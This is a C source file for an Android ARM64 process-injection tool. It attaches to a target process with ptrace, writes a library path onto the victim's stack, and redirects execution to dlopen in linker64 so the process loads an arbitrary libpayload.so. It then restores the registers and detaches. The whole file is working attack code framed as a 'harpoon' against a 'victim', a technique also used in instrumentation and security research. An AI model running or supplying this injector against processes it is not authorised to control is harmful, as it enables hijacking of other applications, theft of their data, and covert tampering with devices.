#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <elf.h>
#include <string.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include<address_finder.h>

int arpoon(int target_pid, uintptr_t dl_open_address, char* payload_path){
    size_t payload_path_len = strlen(payload_path);
    printf("Payload path is: %s\n", payload_path);
    printf("[*] Shooting the harpoon at PID %d...\n", target_pid);

    // PTRACE_ATTACH: Linux send a SIGSTOP signal to the victim.
    // Victim freezes immediately.
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
        perror("[-] Failed to attach! Do you have permission (sudo)?");
        return 1;
    }

    // The attaching is asynchronous, we have to wait Kernel's confirmation that the CPU really froze the victim
    waitpid(target_pid, NULL, 0);
    printf("[+] Victim successfully frozen!\n");

    struct user_regs_struct regs;
    struct user_regs_struct regs_copy;
    struct iovec io;
    io.iov_base = &regs;
    io.iov_len = sizeof(regs);

    if (ptrace(PTRACE_GETREGSET, target_pid, (void*)NT_PRSTATUS, &io) < 0) {
        perror("[-] Fail reading registers");
        return 1;
    }

    memcpy(&regs_copy, &regs, sizeof(regs));

    // Creates space inside the stack for the path
    // Stack after the copy
    // 0x100 - e  ---> current stack top
    // 0x101 - x
    // 0x102 - a
    // 0x103 - m
    // 0x104 - p
    // 0x105 - l
    // 0x106 - e
    // 0x107 - \0 ---> previous stack top
    // Still, when we pass an address as the start of the string, the string is read from the lower address to the higher
    // IMPORTANT: sp demands 16 bits alignment during function calls!!! so it needs to end in 0x0000
    regs.sp = (regs.sp - payload_path_len) & ~0xF;

    printf("[+] The payload path string was injected at the address %llx\n", regs.sp);

    // The 'problem' here is that ptrace copies 8 bytes at a time
    // To adjust every char from 1 to 8 bytes we do the following
    for (int i = 0; i < payload_path_len; i+=8) { // run the entire string len

        unsigned long word = 0; // initialize a clean word: 8 bytes

        // do the correct size step to get 8 bytes of the path, or the remaining
        const unsigned int step = i + 8 < payload_path_len ? 8 : payload_path_len -i;

        // pointer arithmetic: payload_path + i gives you payload_path[0], payload_path[8] and so on
        // this mark the src start for the copy
        memcpy(&word, payload_path +  i, step);

        // Inject the data, 8 bytes at a time
        // move the address of SP n*8 bytes up, to adjust the offset
        ptrace(PTRACE_POKEDATA, target_pid, regs.sp + i,  word);
    }


     //* 1 - put the regs.sp at regs.regs[0] ARM X) register, pointer to the first part of the string, the first argument to the function call
     //* 2 - put the regs.pc at the base address + offset to call the dlopen
     //* 3- call the linux api to copy the regs struct to the cpu regs


    regs.regs[0] = regs.sp;
    regs.regs[1] = 2; // 2 = RTLD_NOW. Makes dlopen resolve everything immediately
    // X30 is the LR. The address where the process should get back from the PC--->dlopen.
    // I purposefully put a value that's going to causa a segmentation fault.
    // Since the debugger/ptrace is attached, we regain control of the program and can control its
    // flow again
    regs.regs[30] = 0;
    regs.pc = dl_open_address;

    printf("[+] About to deliver the payload!\n");

    if (ptrace(PTRACE_SETREGSET, target_pid, (void*)NT_PRSTATUS, &io) < 0) {
        perror("[-] Fail writing registers");
        return 1;
    }

    if (ptrace(PTRACE_CONT, target_pid, NULL, NULL) < 0) {
        perror("[-] Fail continuing execution");
        return 1;
    }

    waitpid(target_pid, NULL, 0);


    io.iov_base = &regs_copy;
    io.iov_len = sizeof(regs_copy);

    if (ptrace(PTRACE_SETREGSET, target_pid, (void*)NT_PRSTATUS, &io) < 0) {
        perror("[-] Fail writing registers");
        return 1;
    }


    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    printf("[+] Victim released. End of attack.\n");

    return 0;
}

void build_payload_path_safe(const char* package_name, char* buffer, size_t buffer_size) {
    if (package_name != NULL && buffer != NULL && buffer_size > 0) {
        snprintf(buffer, buffer_size, "/data/data/%s/libpayload.so", package_name);
    }
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <pid ><package> \n", argv[0]);
        fprintf(stderr, "Ex:  %s 1234 com.example.myapp\n", argv[0]);
        return 1;
    }

    int target_pid = atoi(argv[1]);
    char* package = argv[2];
    uintptr_t dlopen_offset = find_dlopen_offset();
    uintptr_t dlopen_base = find_module_base(target_pid, "linker64");
    uintptr_t real_addr = dlopen_base + dlopen_offset;
    char payload_path[512];
    build_payload_path_safe(package, payload_path, sizeof(payload_path));

    printf("PID:            %d\n", target_pid);
    printf("linker64 Base:   0x%" PRIxPTR "\n", dlopen_base);
    printf("dlopen Offset:         0x%" PRIxPTR "\n", dlopen_offset);
    printf("Real address:  0x%" PRIxPTR "\n", real_addr);
    printf("Payload path: %s \n", payload_path);

    arpoon(target_pid, real_addr, payload_path);

    return 0;
}

